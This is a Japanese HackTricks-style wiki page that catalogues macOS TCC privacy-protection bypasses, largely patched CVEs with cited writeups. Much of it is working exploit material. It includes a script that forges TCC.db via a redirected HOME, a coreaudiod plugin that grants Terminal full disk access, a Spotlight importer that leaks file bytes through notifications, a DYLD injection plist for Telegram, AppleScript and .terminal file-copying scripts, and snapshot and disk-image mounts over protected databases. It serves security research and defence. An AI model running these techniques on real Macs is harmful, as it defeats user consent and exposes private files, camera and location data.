# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## 機能別

### Write Bypass

これはbypassではなく、TCCの仕組みです。**TCCは書き込みを保護しません**。TerminalにユーザーのDesktopを読み取るアクセス権が**なくても、Desktopに書き込むことはできます**：

```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```

**拡張属性 `com.apple.macl`** は、新しい**ファイル**に追加され、**作成元のアプリ**にそのファイルを読み取る権限を与えます。<sup>[[2]](#references)</sup>

### TCC ClickJacking

**TCCプロンプトの上にウィンドウを重ねる**ことで、ユーザーに気づかれずに**承認**させることが可能です。PoCは[**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**で**確認できます。<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### 任意の名前によるTCCリクエスト

攻撃者は、**`Info.plist`** で任意の名前（例：Finder、Google Chrome...）の**アプリを作成**し、TCCで保護された場所へのアクセスを要求させることができます。ユーザーは、正規のアプリがアクセスを要求していると思い込むでしょう。\
さらに、**Dockから正規のアプリを削除し、偽アプリを置く**ことも可能です。ユーザーが偽アプリ（同じアイコンを使用可能）をクリックすると、正規のアプリを起動してTCC権限を要求し、マルウェアを実行できます。これにより、ユーザーは正規のアプリがアクセスを要求したと思い込みます。<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

詳しい情報とPoCはこちら：

{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

デフォルトでは、**SSH経由のアクセスには「Full Disk Access」が付与されていました**。これを無効にするには、リストに表示したまま無効化する必要があります（リストから削除しても権限は取り消されません）。<sup>[[2]](#references)</sup>

![TCC Request by arbitrary name - SSH Bypass: デフォルトでは、SSH経由のアクセスには「Full Disk Access」が付与されていました。これを無効にするには、リストに表示したまま無効化する必要があります（リストから削除しても...](<../../../../../images/image (1077).png>)

以下では、**この保護を回避したマルウェアの例**を確認できます。

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> 現在、SSHを有効にするには**Full Disk Access**が必要です。

### 拡張子の処理 - CVE-2022-26767

属性 **`com.apple.macl`** は、**特定のアプリケーションにファイルを読み取る権限を与える**ためにファイルに付与されます。この属性は、ファイルをアプリに**ドラッグ＆ドロップ**したとき、またはユーザーがファイルを**ダブルクリック**して**デフォルトのアプリケーション**で開いたときに設定されます。

そのため、ユーザーが拡張子をすべて処理する**悪意のあるアプリを登録**し、Launch Servicesを呼び出して任意のファイルを**開かせる**ことができます（これにより、悪意のあるファイルに読み取り権限が付与されます）。<sup>[[23]](#references)</sup>

### iCloud

entitlement **`com.apple.private.icloud-account-access`** を使うと、**`com.apple.iCloudHelper`** XPC serviceと通信し、**iCloud tokens**を取得できます。

**iMovie**と**Garageband**には、このentitlementや、これを可能にする他のentitlementがありました。

このentitlementを利用して**iCloud tokensを取得する**exploitの詳細は、講演[**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)をご覧ください。<sup>[[10]](#references)</sup>

### Darwin notification namesを介したSpotlight importer leakage

Spotlight importerは、通常のプロセスがFull Disk Accessなしでは読み取れないファイルでも、Spotlightが`GetMetadataForFile` callbackに渡すファイルを読み取れます。[TCC認可済みプロセスへのcode injection](../macos-tcc-credential-and-data-theft.md)とは異なり、これにはimporterをインストールし、対応するSpotlight indexing eventを発生させられるローカル foothold が必要です。importerはsandbox内で動作しますが、名前のみのDarwin notificationsを使って、sandbox外のlistenerにバイト列を渡せます。これはdata-leak channelであり、importerからroot権限や任意のファイルアクセスを得る手段ではありません。<sup>[[24]](#references)</sup>

importerの`Info.plist`で、`CFBundleDocumentTypes` → `LSItemContentTypes`の下に対象ファイルタイプを宣言し、bundleを`~/Library/Spotlight/`またはアプリの`Contents/Library/Spotlight/`にインストールします。`mdimport -L`で登録を確認してください。[Spotlight importerのセクション](../../../../macos-auto-start-locations.md#spotlight-plugins)では、bundleの配置とファイルタイプの照合について説明しています。importerが受け取るのは、Spotlightがそのimporterを選択したファイルのみです。通常、既存のimporterが優先されます。macOS 26 Tahoeでは、報告されたテストにおいて`mdimport -i`は即時の再帰的なindexingを確実には強制しませんでした。一方、`mdimport -r ~/Library/Spotlight/Spotlight.mdimporter`は、そのimporterが対応すると宣言したUTIの再importを要求しました。<sup>[[24]](#references)</sup>

channelをテストするには、sandbox外で`notifyutil -w TEST_TEST_TEST`を使ってlistenerを起動し、`CFNotificationCenterGetDarwinNotifyCenter()`と`NULL`のobjectおよび`userInfo`でnotificationをpostします。`userInfo` payloadを持つdistributed notificationとは異なり、Darwin notificationが持つのは名前のみです。バイナリデータを送るには、`notify_register_dispatch`を使って外部listenerを10進数の名前`0`〜`255`に登録し、各callbackのregistrationを対応するバイト値にマッピングします。`GetMetadataForFile`内では、Spotlightから渡された`pathToFile`だけを読み取り、各バイトを10進数のnotification nameとして送信します。<sup>[[24]](#references)</sup>

```objectivec
NSData *data = readBytes(pathToFile); // helper reading Spotlight's selected file
const uint8_t *bytes = data.bytes;
for (NSUInteger i = 0; i < data.length; i++) {
    CFStringRef name = CFStringCreateWithFormat(NULL, NULL,
                                                 CFSTR("%u"), bytes[i]);
    CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(),
                                         name, NULL, NULL, true);
    CFRelease(name);
}
```

リスナーは、TCCで保護されたファイル自体を読み取るのではなく、バイト列を再構成します。公開されたPoCでは、macOS 26でSIPが有効な状態において、FDA未付与のターミナルから`knowledgeC.db`の先頭64バイトを復元しました。これは帯域幅が小さく、大量コピーの方法としては信頼できません。Spotlightが対象ファイルをインデックス化または再インデックス化しない場合があり、複数のインポーターインスタンスが同時に動作すると、通知ストリームが交錯する可能性があります。サンドボックス境界を越えるその他の手法については、[macOS Sandbox Debug & Bypass](../../macos-sandbox/macos-sandbox-debug-and-bypass/)を参照してください。<sup>[[24]](#references)</sup>

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`**の権限を持つアプリは、**他のアプリを制御**できます。つまり、**他のアプリに付与された権限を悪用**できる可能性があります。<sup>[[2]](#references)</sup>

Apple Scriptsの詳細については、以下を参照してください。


{{#ref}}
macos-apple-scripts.md
{{#endref}}

たとえば、あるアプリが**`iTerm`に対するAutomation権限**を持っている場合、次の例のように、**`Terminal`**がiTermにアクセスできます。

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### iTerm経由

FDAを持たないTerminalは、FDAを持つiTermを呼び出し、iTermを使って操作を実行できます。

```applescript:iterm.script
tell application "iTerm"
    activate
    tell current window
        create tab with default profile
    end tell
    tell current session of current window
        write text "cp ~/Desktop/private.txt /tmp"
    end tell
end tell
```

```bash
osascript iterm.script
```

#### Finder経由

または、あるAppがFinder経由でアクセスできる場合、次のようなスクリプトを実行できます。

```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```

## アプリの動作別

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

ユーザーランドの **tccd daemon** は **`HOME`** **環境変数**を使用して、次の場所にある TCC ユーザーデータベースにアクセスしていました: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[この Stack Exchange の投稿](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)によると、また TCC daemon は現在のユーザーのドメイン内で `launchd` 経由で実行されているため、渡される**すべての環境変数を制御できます**。<sup>[[19]](#references)</sup>\
したがって、**攻撃者は `launchctl` で `$HOME` 環境変数を設定**して**制御下のディレクトリ**を指定し、**TCC** daemon を**再起動**したうえで、エンドユーザーに一度も確認を求めることなく、**TCC データベースを直接変更**して自身に**利用可能なすべての TCC entitlement を付与できます**。<sup>[[1]](#references)</sup>\
PoC:

```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
                   'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
                   NULL,
                   NULL,
                   'UNUSED',
                   NULL,
                   NULL,
                   1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```

### CVE-2021-30761 - Notes

NotesはTCCで保護された場所にアクセスできましたが、新しく作成されたノートは**保護されていない場所に保存**されていました。そのため、攻撃者はNotesに保護されたファイルをノートへコピーさせ、保護されていない場所からコピー後のデータにアクセスできました:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

`libsecurity_translocate`ライブラリを使用するバイナリ`/usr/libexec/lsd`には、**nullfs**マウントの作成を許可するentitlement `com.apple.private.nullfs_allow`と、すべてのファイルへのアクセスを許可する**`kTCCServiceSystemPolicyAllFiles`**付きのentitlement `com.apple.private.tcc.allow`がありました。

「Library」にquarantine属性を追加し、**`com.apple.security.translocation`** XPCサービスを呼び出すことで、Libraryを**`$TMPDIR/AppTranslocation/d/d/Library`**にマッピングし、Library内のすべての書類に**アクセス**できました。

### CVE-2024-44131 - FileProvider symlink race

ファイル操作を**特権ヘルパー**（ここでは**`fileproviderd`** / `Files.app`）に委ねるアプリは、**ユーザーに代わって**項目をコピーまたは移動するため、コピーは呼び出し元ではなくヘルパーの権限で実行されます。

Jamf Threat Labsは、操作前に行われるsymlinkの検証に対して**race**を仕掛けられることを示しました。検証されるパスの**最後**のコンポーネントにsymlinkを仕掛けるのではなく、コピーが開始された**後に**パス中の**中間**ディレクトリを差し替えます。すると特権ヘルパーは攻撃者が制御するリンクをたどり、プロンプトを一度も表示せずにTCCで保護された場所を読み書きします。<sup>[[5]](#references)</sup>

パスにランダムなUUIDが含まれていないディレクトリ（たとえば`~/Library/Mobile Documents/com~apple~CloudDocs`）は、raceを仕掛けるためのフルパスを攻撃者が予測できるため、特に狙いやすい標的です。

> [!TIP]
> 注目すべき一般的なパターンは次のとおりです。**パスを複数回解決する特権プロセス**（check-then-use、またはソースと宛先を別々に解決する`rename()` / `copyfile()`）は、パス中のディレクトリを差し替えることでraceを仕掛けられます。ウィンドウを確実に閉じられるのは`O_NOFOLLOW_ANY`、すでに開かれたディレクトリFDに対する`openat()`、または`realpath()`と再検証だけです。

詳しくは[**Jamf Threat Labsのwriteup**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)を参照してください。<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3`は`SQLITE_ENABLE_SQLLOG`を有効にしてビルドでき、環境変数によって動作するログ記録フックが追加されます（[upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)）。<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – **開かれたすべてのデータベース**について、**データベースファイルのコピー**とSQL文のログが`path`に書き込まれます（ディレクトリは事前に存在している必要があります）。
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – DBが開かれるかattachされるたびに、既存のコピーを再利用せず**新しいコピーを作成**します。
- **`SQLITE_SQLLOG_CONDITIONAL`** – メインDBの隣に`<database>-sqllog`ファイルがある場合のみ、接続をログに記録します。

この変数をFDA権限があり、SQLiteデータベースを開くプロセスに注入できれば、プロセスは保護されたデータベースを制御下のディレクトリに**コピー**します。宛先ファイル名は攻撃者が制御できるデータから決まるため、宛先に仕掛けた**symlink**を使えば、同じ手法で対象プロセスの権限による**任意のファイル書き込み**も可能です。

### **SQLITE_AUTO_TRACE**

環境変数**`SQLITE_AUTO_TRACE`**が設定されていると、ライブラリ**`libsqlite3.dylib`**はすべてのSQLクエリの**ログ記録**を開始します。多くのアプリケーションがこのライブラリを使用していたため、それらのアプリケーションのSQLiteクエリをすべてログに記録できました。<sup>[[22]](#references)</sup>

複数のApple製アプリケーションが、このライブラリを使ってTCCで保護された情報にアクセスしていました。

```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```

### 環境変数によるファイル書き込みを探す

前の2つの事例は、どちらも同じ汎用的な手法です。さらに探してみる価値があります。**TCC権限を持つアプリに読み込まれるフレームワークには、デバッグ用またはログ用の環境変数が公開されていることが多く、プロセスに呼び出し側が指定したパスへファイルを作成させられる場合があります**。

探す手順：

1. FDAなどの価値あるTCC権限を持つ対象（`Music`、`TV`、`Terminal`、MDM agentなど）を選び、リンクしているフレームワークを一覧にします（`otool -L`、`vmmap`）。
2. そのフレームワーク内で`getenv`の文字列を検索します：`strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`。
3. `launchctl setenv NAME /path/you/control`で候補の環境変数を設定してアプリを起動し、`fs_usage -w -f filesys <pid>`または`sudo fs_usage | grep <path>`でファイルシステム上の動作を監視します。
4. プロセスが自分のディレクトリ内にファイルを**作成または名前変更**する場合、write primitiveを得たことになります。宛先をシンボリックリンクに向ける（または、上記のCVE-2024-44131のように中間ディレクトリでraceを仕掛ける）ことで、書き込み先を`~/Library/Application Support/com.apple.TCC/TCC.db`にリダイレクトできます。

> [!TIP]
> 制約が2つあります。1つ目は、**hardened runtimeのバイナリでは、アプリに[`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) entitlement（「アプリのプロセスへのコード注入に使える動的リンカ環境変数の影響をアプリが受ける可能性があるかを示すBoolean値」）がない限り、`DYLD_*`変数は無視される**ことです。詳しくは[Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)も参照してください。2つ目は、報告を受けるとAppleが個々のフレームワークのデバッグ変数を削除するため、あるmacOSリリースで使えた変数が、次のリリースでは使えなくなっていることがよくあります。変数を設定した後にアプリが何も表示せず起動を拒否した場合、その変数はすでにフィルタリングされているものとして扱ってください。<sup>[[7]](#references)[[8]](#references)</sup>

リンカ変数を使った同様の手法については、[macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md)を参照してください。

### Apple Remote Desktop

root権限があればこのサービスを有効にできます。**ARD agentはFull Disk Accessを持つ**ため、ユーザーがこれを悪用して、新しい**TCC user database**をコピーさせることができます。

## **NFSHomeDirectory**経由

TCCは、ユーザー固有のリソースへのアクセスを制御するため、ユーザーのHOMEフォルダ内にあるデータベース（**$HOME/Library/Application Support/com.apple.TCC/TCC.db**）を使用します。\
そのため、ユーザーが$HOME環境変数を**別のフォルダ**に設定してTCCを再起動させることができれば、**/Library/Application Support/com.apple.TCC/TCC.db**に新しいTCC databaseを作成し、TCCに任意のアプリへの任意のTCC権限を許可させることができます。

> [!TIP]
> Appleはユーザープロファイルに保存された**`NFSHomeDirectory`**属性を**`$HOME`の値**として使用しています。そのため、この値を変更する権限（**`kTCCServiceSystemPolicySysAdminFiles`**）を持つアプリを侵害できれば、TCC bypassでこの手法を**weaponize**できます。

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**最初のPOC**では、[**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/)と[**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/)を使ってユーザーの**HOME**フォルダを変更します。

1. 対象アプリの_csreq_ blobを取得します。
2. 必要なアクセス権と_csreq_ blobを設定した偽の_TCC.db_ファイルを配置します。
3. [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/)を使ってユーザーのDirectory Servicesエントリをエクスポートします。
4. Directory Servicesエントリを変更し、ユーザーのホームディレクトリを変更します。
5. 変更したDirectory Servicesエントリを[**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/)でインポートします。
6. ユーザーの_tccd_を停止し、プロセスを再起動します。

2つ目のPOCでは、値として`kTCCServiceSystemPolicySysAdminFiles`を持つ`com.apple.private.tcc.allow`を備えた**`/usr/libexec/configd`**を利用しました。\
**`configd`**は**`-t`**オプションを指定して実行でき、攻撃者は**読み込むカスタムBundleを指定**できます。そのため、このexploitではユーザーのホームディレクトリを変更する**`dsexport`**と**`dsimport`**の手法を、**`configd`のcode injection**に置き換えています。

詳しくは[**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)を参照してください。<sup>[[11]](#references)</sup>

## プロセスインジェクション経由

プロセス内にコードをinjectし、そのTCC権限を悪用する手法はいくつかあります。


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

さらに、TCC bypassでよく見つかるプロセスインジェクションの手法は、**plugins（load library）**経由です。\
Pluginsは通常、ライブラリまたはplist形式の追加コードで、**メインアプリケーションによって読み込まれ**、そのコンテキストで実行されます。そのため、メインアプリケーションが（許可された権限またはentitlementsを通じて）TCCで制限されたファイルにアクセスできる場合、**カスタムコードも同じアクセス権を持つ**ことになります。

### CVE-2020-27937 - Directory Utility

アプリケーション`/System/Library/CoreServices/Applications/Directory Utility.app`には**`kTCCServiceSystemPolicySysAdminFiles`** entitlementがあり、拡張子が**`.daplug`**のpluginsを読み込みましたが、hardened runtimeは**有効になっていませんでした**。

このCVEをweaponizeするには、（前述のentitlementを悪用して）**`NFSHomeDirectory`**を**変更**し、ユーザーのTCC databaseを**乗っ取って**TCCをbypassします。

詳しくは[**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)を参照してください。<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

バイナリ**`/usr/sbin/coreaudiod`**には、`com.apple.security.cs.disable-library-validation`と`com.apple.private.tcc.manager`のentitlementsがありました。前者は**コードインジェクションを許可**し、後者は**TCCを管理するアクセス権**を与えていました。

このバイナリは、フォルダ`/Library/Audio/Plug-Ins/HAL`から**サードパーティ製plug-ins**を読み込めました。そのため、以下のPOCで**pluginを読み込ませ、TCC権限を悪用**できました：<sup>[[13]](#references)</sup>

```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

    CFStringRef bundleID = CFSTR("com.apple.Terminal");
    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
    SecRequirementRef requirement = NULL;
    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
    CFDataRef requirementData = NULL;
    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

    add_tcc_entry();

    NSLog(@"[+] Exploitation finished...");
    exit(0);
```

詳細については、[**original report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)を確認してください。<sup>[[13]](#references)</sup>

### Device Abstraction Layer (DAL) Plug-Ins

Core Media I/O 経由でカメラストリームを開くシステムアプリケーション（**`kTCCServiceCamera`** を持つアプリ）は、（SIP による制限を受けない）`/Library/CoreMediaIO/Plug-Ins/DAL` にあるこれらのプラグインを**プロセス内に読み込みます**。

一般的な**コンストラクタ**を含むライブラリをそこに置くだけで、**コードを注入**できます。

複数の Apple アプリケーションがこの脆弱性の影響を受けました。

### Firefox

Firefox アプリケーションには、`com.apple.security.cs.disable-library-validation` および `com.apple.security.cs.allow-dyld-environment-variables` エンタイトルメントがありました。<sup>[[14]](#references)</sup>

```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
    <true/>
    <key>com.apple.security.cs.disable-library-validation</key>
    <true/>
    <key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
    <true/>
    <key>com.apple.security.device.audio-input</key>
    <true/>
    <key>com.apple.security.device.camera</key>
    <true/>
    <key>com.apple.security.personal-information.location</key>
    <true/>
    <key>com.apple.security.smartcard</key>
    <true/>
</dict>
</plist>
```

Firefox を簡単に exploit する方法の詳細については、[**元のレポートを確認してください**](https://wojciechregula.blog/post/how-to-rob-a-firefox/)。<sup>[[14]](#references)</sup>

### CVE-2020-10006

バイナリ `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` には、**`com.apple.private.tcc.allow`** と **`com.apple.security.get-task-allow`** のentitlementが設定されていました。これにより、プロセス内にコードをinjectし、TCCの権限を利用できました。

### CVE-2023-26818 - Telegram

Telegram には **`com.apple.security.cs.allow-dyld-environment-variables`** と **`com.apple.security.cs.disable-library-validation`** のentitlementが設定されていたため、これを悪用して、カメラでの録画など、Telegramが持つ権限にアクセスできました。[**writeupでpayloadを確認できます**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)。<sup>[[15]](#references)</sup>

環境変数を使ってライブラリを読み込ませるために、**カスタムplist**を作成してこのライブラリをinjectし、**`launchctl`**で起動した点に注目してください。<sup>[[15]](#references)</sup>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
       <key>Label</key>
        <string>com.telegram.launcher</string>
        <key>RunAtLoad</key>
        <true/>
        <key>EnvironmentVariables</key>
        <dict>
          <key>DYLD_INSERT_LIBRARIES</key>
          <string>/tmp/telegram.dylib</string>
        </dict>
        <key>ProgramArguments</key>
        <array>
  <string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
        </array>
        <key>StandardOutPath</key>
        <string>/tmp/telegram.log</string>
        <key>StandardErrorPath</key>
        <string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```

## openの呼び出しによる方法

sandbox内でも**`open`**を呼び出すことが可能です

### Terminalスクリプト

特に技術者が使うコンピュータでは、Terminalに**Full Disk Access（FDA）**を許可することはよくあります。また、Terminalから**`.terminal`**スクリプトを呼び出すことも可能です。

**`.terminal`**スクリプトは、次の例のように、実行するコマンドを**`CommandString`**キーに含むplistファイルです。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>cp ~/Desktop/private.txt /tmp/;</string>
    <key>ProfileCurrentVersion</key>
    <real>2.0600000000000001</real>
    <key>RunCommandAsShell</key>
    <false/>
    <key>name</key>
    <string>exploit</string>
    <key>type</key>
    <string>Window Settings</string>
</dict>
</plist>
```

アプリケーションは、/tmp などの場所にターミナルスクリプトを書き込み、次のようなコマンドで実行できます。

```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```

## マウントによる

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**すべてのユーザー**（権限のないユーザーも含む）は、Time Machineスナップショットを作成してマウントし、そのスナップショット内の**すべてのファイルにアクセス**できます。\
必要な**唯一の特権**は、使用するアプリケーション（`Terminal`など）に**Full Disk Access**（FDA）アクセス（`kTCCServiceSystemPolicyAllfiles`）が付与されていることです。これは管理者が付与する必要があります。<sup>[[2]](#references)</sup>

```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```

より詳細な説明は[**元のレポートに記載されています**](https://theevilbit.github.io/posts/cve_2020_9771/)**。**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - TCCファイルへのマウント

TCC DBファイルは保護されていても、ディレクトリに新しいTCC.dbファイルを**マウントして上書きする**ことが可能でした。

```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
    os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
    os.system("mkdir /tmp/mnt")
    os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
    os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
    os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
    os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```

[**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/)で**full exploit**を確認してください。<sup>[[21]](#references)</sup>

### CVE-2024-40855

[original writeup](https://www.kandji.io/blog/macos-audit-story-part2)で説明されているように、このCVEは`diskarbitrationd`を悪用しました。<sup>[[16]](#references)</sup>

公開されている`DiskArbitration` frameworkの関数`DADiskMountWithArgumentsCommon`がセキュリティチェックを実行していました。しかし、`diskarbitrationd`を直接呼び出すことでこのチェックをバイパスし、パス内の`../`要素やシンボリックリンクを使用できました。

これにより、攻撃者は`diskarbitrationd`のentitlement `com.apple.private.security.storage-exempt.heritable`を利用して、TCC databaseを含む任意の場所に任意のマウントを行うことができました。

### asr

ツール**`/usr/sbin/asr`**は、TCC protectionsをバイパスしてディスク全体をコピーし、別の場所にマウントすることができました。

### CVE-2022-22655 - Location Services

Location Servicesは、他のサービスのようにTCC databaseには保存されません。`locationd`によって管理され、`locationd`は独自のallow-listを**`/var/db/locationd/clients.plist`**に保持します。<sup>[[4]](#references)</sup>

```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```

各エントリはクライアント（bundle ID または実行ファイルのパス）をキーとし、`Authorized`、`BundleId`、`Executable`、`Registered` などのフィールドを持ちます。<sup>[[4]](#references)</sup>

`clients.plist` ファイル自体は Sandbox/TCC によって保護されており、root であっても編集できません。しかし、**`/var/db/locationd/` ディレクトリはマウントから保護されていませんでした**。そのため、root で実行する攻撃者は、独自の `clients.plist`（自分のバイナリを `Authorized` としてマークしたもの）を含むディスクイメージを作成してディレクトリにマウントし、その後 `locationd` を再起動することで、偽造した許可リストを有効にできました。<sup>[[3]](#references)</sup>

> [!TIP]
> これは前述の `hdiutil`/`mount` による TCC bypass と同じパターンです。*ファイル*は保護されていますが、そのファイルが置かれている*ディレクトリ*は保護されていないため、ファイルではなくディレクトリ全体を置き換えます。

## 起動アプリ経由


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## grep経由

いくつかのケースでは、メールアドレス、電話番号、メッセージなどの機密情報が保護されていない場所に保存されています（これは Apple における脆弱性に該当します）。

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

現在は動作しませんが、[**過去には動作していました**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

[**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf) を使う別の方法:<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

